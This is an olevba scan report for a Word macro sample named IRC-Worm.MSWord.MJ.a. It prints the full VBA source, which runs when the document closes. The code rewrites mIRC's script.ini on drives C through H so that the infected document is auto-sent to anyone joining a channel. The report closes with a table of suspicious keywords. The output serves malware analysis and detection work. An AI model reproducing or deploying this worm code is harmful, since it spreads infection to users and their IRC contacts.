olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSWord.MJ.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: IRC-Worm.MSWord.MJ.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 'mirc joke by CyberShadow//SMF
 'Smiles to harmless :)
 MyDir = CurDir
 For i = 0 To 5
  a = Chr$(Asc("C") + i)
  Call infect(a)
 Next
End Sub
Private Sub infect(a)
 On Error GoTo outta
 a = a + ":\mirc\"
 Open a + "script.ini" For Output As #1
  Print #1, "[script]"
  Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a + "NewFiles.doc"
 Close #1
 ActiveDocument.Save
 ActiveDocument.SaveAs a + "NewFiles.doc"
 ActiveDocument.Close
outta:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

